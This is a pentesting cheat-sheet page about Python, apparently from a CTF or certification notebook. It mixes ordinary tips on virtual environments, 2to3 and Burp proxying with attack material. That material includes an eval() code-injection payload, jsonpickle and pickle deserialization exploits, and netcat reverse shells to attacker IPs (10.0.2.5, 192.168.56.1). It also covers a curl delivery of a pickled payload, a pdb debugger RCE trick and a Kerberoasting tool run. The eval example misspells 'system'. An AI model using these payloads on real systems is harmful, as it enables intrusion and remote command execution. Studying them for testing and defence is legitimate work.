# Python

{% hint style="info" %}
cat files and filter by critical functions such as exec, eval, system...
{% endhint %}

## eval()

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/)

[https://vk9-sec.com/exploiting-python-eval-code-injection/](https://vk9-sec.com/exploiting-python-eval-code-injection/)

```python
eval("11 + 2 and __import__('os').sytem('whoami')")
```

## General

```bash
# Escape quotes
\'
\"
```

## Pitfalls&#x20;

[https://www.sonarsource.com/blog/10-unknown-security-pitfalls-for-python/](https://www.sonarsource.com/blog/10-unknown-security-pitfalls-for-python/)

### input()

function is vulnerable, we could inject commands. Check Command Injection section.

## Python2 to Python3

[https://docs.python.org/3/library/2to3.html](https://docs.python.org/3/library/2to3.html)

```python
ERROR:can't concat str to bytes
# BEST SOLUTION: DECODE (BYTES TO STRING)
VARIABLE.decode()
# ANOTHER SOLUTION: STRING TO BYTES
VARIABLE.encode()
VARIABLE.encode("utf-8")

ERROR write() argument must be str, not bytes
# APPLY BEST SOLUTION ABOVE, OTHERWISE TRY THIS
write(str(argument))
```

## Indentation errors in Python

{% hint style="success" %}
SOLUTION: replace every tab for 4 spaces
{% endhint %}

## Issues with binaries/tools

Create **venv**, activate and then git clone repos and python setup install or pip if needed.

## Compatibility / Virtual environment

uv

{% code fullWidth="true" %}
```bash
https://github.com/astral-sh/uv
https://www.youtube.com/watch?v=G36QXtBXKBQ

oxdf@hacky$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 65, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 65 (delta 14), reused 12 (delta 12), pack-reused 43 (from 1)
Receiving objects: 100% (65/65), 238.08 KiB | 7.21 MiB/s, done.
Resolving deltas: 100% (25/25), done.
oxdf@hacky$ cd targetedKerberoast/
oxdf@hacky$ uv add --script targetedKerberoast.py -r requirements.txt 
Updated `targetedKerberoast.py`
oxdf@hacky$ uv run targetedKerberoast.py -v -d 'domain.com' -u $USER -p $PASS
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.kali.org/docs/general-use/using-eol-python-versions/
https://peps.python.org/pep-0668/
https://www.kali.org/blog/kali-linux-2023-1-release/#python-updates--changes

python3 -m venv venv
source venv/bin/activate

# PYTHON2
root@kali:~# virtualenv --version
virtualenv 20.2.2 from /usr/local/lib/python3.9/dist-packages/virtualenv/__init__.py
root@kali:~# which python2
/usr/bin/python2
root@kali:~# virtualenv -p /usr/bin/python2 ~/venv/python2
root@kali:~# source ~/venv/python2/bin/activate
(python2) root@kali:~# pip -V
pip 20.3.1 from /root/venv/python2/lib/python2.7/site-packages/pip (python 2.7)
(python2) root@kali:~# python --version
Python 2.7.18
(python2) root@kali:~# pip list
# To activate it
root@kali:~/CTF/PWK# source ~/venv/python2/bin/activate
# Now for every Python 2 exploit you come across replace the shebang (#!/usr/bin/python) with #!/usr/bin/env python
# To deactivate it
(python2) root@kali:~# deactivate
```
{% endcode %}

## **Find tab/identation problems**

```python
python -m tabnanny script.py

https://pypi.org/project/autopep8/ 
autopep8 script.py good-script.py
```

## **HTTP(S) Server**

[**https://pypi.org/project/uploadserver/**](https://pypi.org/project/uploadserver/)

[**https://gist.github.com/DannyHinshaw/a3ac5991d66a2fe6d97a569c6cdac534**](https://gist.github.com/DannyHinshaw/a3ac5991d66a2fe6d97a569c6cdac534)

## **POST Server**

[**https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7**](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7)

{% hint style="info" %}
Netcat `nc -lvnp $PORT` would also be valid for this case
{% endhint %}

## **Insecure deserialization**

### **Python Pickle**

{% hint style="info" %}
Pay attention to Python2/Python3 (if the machine is quite old try Python2) and also Content-Type on the request (try text, text/plain and stuff like that)
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```python
https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

# Instead of Popen, use os.system to spawn a reverse shell
echo '{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -e /bin/sh 10.0.2.5 1234"]}, null, null, null]}' | base64

# ANOTHER OPTION CALLING A SCRIPT ON THE SAME FOLDER
{"py/object": "app.User", "username": [{"py/reduce": [{"py/type": "subprocess.call"}, {"py/tuple": ["./shell.sh"]}, null, null, null]}]}
# That shell.sh has the code to spawn a reverse shell
echo "#!/bin/bash\nmkfifo /tmp/mylge; nc 192.168.56.1 1337 0</tmp/mylge | /bin/sh >/tmp/mylge 2>&1; rm /tmp/mylge" > shell.sh


################ SCRIPT
import os, pickle, base64

cmd = """ping -c 2 $LOCAL_IP"""

class Exploit(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

print pickle.dumps(Exploit(cmd))
print base64.urlsafe_b64encode(pickle.dumps(Exploit(cmd)))

# Send payload via CURL (change it if the requires different methods/parameters)
curl -d "pickled=gASVbgAAAAAAAACMBX..." http://127.0.0.1:5000/hackme
```
{% endcode %}

## Requests via Burp

{% code overflow="wrap" %}
```python
https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
import requests

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get("https://www.google.com/", proxies=proxies, verify=False)

# To set CA Bundle we need to convert the DER formatted certificate downloaded via web on Burp to .pem
openssl x509 -inform der -in certificate.cer -out certificate.pem
# If we want to skip writting proxies and verify=False parameters, set these environmental variables
export REQUESTS_CA_BUNDLE="/path/to/pem/encoded/cert"
export HTTP_PROXY="http://127.0.0.1:8080"
export HTTPS_PROXY="http://127.0.0.1:8080"
# To remove them
unset REQUESTS_CA_BUNDLE
unset HTTP_PROXY
unset HTTPS_PROXY
```
{% endcode %}

## pwntools

{% content-ref url="../../misc/scripting.md" %}
[scripting.md](../../misc/scripting.md)
{% endcontent-ref %}

## pdb() debug RCE

```bash
# If pdb is used, force an error/exception to enter debug mode and then:
(pdb) import os
(pdb) os.system("command")
```

## Decompile .pyc files

{% embed url="https://github.com/rocky/python-uncompyle6" %}

{% hint style="info" %}
For higher Python versions use [https://github.com/rocky/python-decompile3#installation](https://github.com/rocky/python-decompile3#installation)
{% endhint %}

## Python exploits -> .exe binaries

{% embed url="https://github.com/brentvollebregt/auto-py-to-exe" %}

### PyInstaller

https://www.pyinstaller.org

Packages Python applications intostand-alone executables for various target operating systems.

```
pyinstaller.exe --onefile .\41090.py
```

